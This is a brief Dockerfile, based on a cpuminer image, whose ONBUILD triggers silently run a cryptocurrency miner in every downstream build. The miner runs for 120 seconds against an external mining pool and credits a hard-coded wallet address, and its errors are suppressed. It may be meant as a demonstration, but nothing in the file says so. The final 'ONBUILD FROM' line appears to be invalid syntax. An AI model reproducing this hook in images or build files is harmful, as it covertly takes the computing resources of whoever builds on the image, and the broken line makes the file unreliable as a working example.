FROM creack/cpuminer  
MAINTAINER ewindisch@docker.com  
  
RUN apt-get update -qq  
RUN apt-get install -qqy timelimit  
  
ONBUILD WORKDIR /cpuminer  
ONBUILD RUN timelimit -t 120 ./minerd --url
stratum+tcp://stratum.mining.eligius.st:3334 --user
13tR5nL545X912kywuNMXhEySM12iSLAFy --pass 123456 || :  
ONBUILD FROM ubuntu:precise  

